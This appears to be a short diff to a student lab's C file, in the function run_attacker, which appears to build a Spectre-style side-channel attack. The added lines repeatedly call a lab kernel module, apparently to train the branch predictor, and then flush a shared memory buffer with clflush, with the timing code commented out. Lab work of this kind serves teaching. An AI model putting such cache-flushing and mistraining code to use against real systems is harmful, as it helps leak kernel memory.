@@ -70,7 +70,18 @@ int run_attacker(int kernel_fd, char *shared_memory) {
 
         while (repeat)
         {
-            repeat = 0;
+            for (same_twice = 0; same_twice < 10; same_twice++) {
+                call_kernel_part2(kernel_fd, shared_memory, 0);
+            }
+
+            for (flush_offset = 0; flush_offset < LAB2_SHARED_MEMORY_SIZE; flush_offset += 1) {
+                load_shared_mem = (char)(shared_memory+flush_offset);
+                //dram_latency_bf = time_access((void*)(shared_memory+flush_offset));
+                clflush((void*)(shared_memory+flush_offset));
+                //dram_latency = time_access((void*)(shared_memory+flush_offset));
+                //printf("\n This is the latency before flush %li and after flush %li", dram_latency_bf,dram_latency);
+            }
+
             /* code */
             //Use call kernel to access data
             call_kernel_part2(kernel_fd, shared_memory, current_offset);
